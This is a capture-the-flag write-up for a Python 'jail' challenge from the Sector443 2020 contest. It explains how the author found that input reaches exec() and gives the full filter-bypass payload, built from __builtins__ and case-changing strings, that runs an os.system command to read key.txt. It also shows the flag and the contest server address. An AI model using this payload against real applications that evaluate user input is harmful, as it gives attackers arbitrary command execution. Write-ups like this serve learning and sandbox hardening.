# Sector443 CTF 2020: Pwn - Re:zero (150 Points)

## Description:

_I forgot to take a screenshot of the description... woops! xD_ 


Anyways, I remember that the description only provided the name of the file `key.txt` that had the flag, it didn't provide any sort of hint so... Moving on!

## Recon and Analysis:

Connecting to the server given in the descript, which was `172.105.53.6 32780` we get the following, cool response. 

```
kali@kali:~/Documents/sector443/re:zero$ nc 172.105.53.6 32780
__        __   _                            _        
\ \      / /__| | ___ ___  _ __ ___   ___  | |_ ___  
 \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \ 
  \ V  V /  __/ | (_| (_) | | | | | |  __/ | || (_) |
   \_/\_/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/ 
                                                     
 ____                   _                                   __ 
/ ___|  __ _ _ __   ___| |_ _   _  __ _ _ __ _   _    ___  / _|
\___ \ / _` | '_ \ / __| __| | | |/ _` | '__| | | |  / _ \| |_ 
 ___) | (_| | | | | (__| |_| |_| | (_| | |  | |_| | | (_) |  _|
|____/ \__,_|_| |_|\___|\__|\__,_|\__,_|_|   \__, |  \___/|_|  
                                             |___/             
 _  __                         _     _       _ _ 
| |/ /_ __ ___ _ __ ___   __ _| | __| |_   _| | |
| ' /| '__/ _ \ '_ ` _ \ / _` | |/ _` | | | | | |
| . \| | |  __/ | | | | | (_| | | (_| | |_| |_|_|
|_|\_\_|  \___|_| |_| |_|\__,_|_|\__,_|\__, (_|_)
                                       |___/     

Try breaking my barrier. You'll find a key to save Emilia inside Roswaal's mansion
>>>
```

Trying out random stuff like `!@#$!%^@"` just to get it to crash, when it crashes it spills out an error that contains the directory and the script name with was `main.py`.


Also, the error was in `exec(string)` of the python script. So I tried to read the content of `key.txt` by supplying `'cat key.txt'` (notice the quotes to supply `exec()` a `string`) but the program terminates without giving me anything.


Next thing to do is search on how to escape this statement, to execute arbitrary code on the machine _Muhahaha!_


## Solution

After one google search on "how to escape python jails" lead me to [this](https://anee.me/escaping-python-jails-849c65cf306e?gi=6a471ceaec7e) article.

Reading it carefully, I tried applying the same technique as the article using `__builtins__` module, and the final payload worked:

```
Try breaking my barrier. You'll find a key to save Emilia inside Roswaal's mansion
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat key.txt')

S443{y0u_l1k3_@n1m3_r1gh7}
```